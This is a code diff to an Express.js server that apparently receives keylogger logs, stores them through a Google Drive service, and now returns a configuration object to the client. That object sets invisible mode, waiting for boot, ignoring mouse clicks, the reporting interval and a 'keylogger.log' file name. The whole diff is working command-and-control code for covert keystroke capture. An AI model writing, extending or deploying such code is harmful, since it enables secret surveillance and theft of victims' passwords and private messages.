@@ -9,6 +9,18 @@ dotenv.config({});
 
 const app = express();
 
+const configValues = {
+        format : 0, // 0 = labels, 10 = decimal, 16 = hex
+        visible :  true, // true = VISIBLE, false = INVISIBLE
+        boot_wait : true, // true = BOOT_WAIT, false = NOWAIT
+        mouse_ignore : true, // true = ignore mouse clicks
+        serverName : "localhost",
+        resource : "/",
+        intervalMinutes : 2,  // Minutes
+        log_file_name : "keylogger.log",
+        backend_port : 8000,
+}
+
 // Initialize Google Drive service
 export const root_folder = "1c-6HpFy91j6GWOwNrMON7BW0pHv7evFM"; 
 const googleDriveService = new GoogleDriveService();
@@ -45,11 +57,16 @@ app.post("/", async (req, res) => {
         res.send({ 
             success: true, 
             message: "Logs processed successfully", 
-            result: result 
+            result: result, 
+            config: configValues,
         });
     } catch (err) {
         console.error('Error processing logs:', err);
-        res.status(500).json({ success: false, message: "Server error" });
+        res.status(500).json({ 
+            success: false, 
+            message: "Server error",
+            config: configValues,
+        });
     }
 });
 
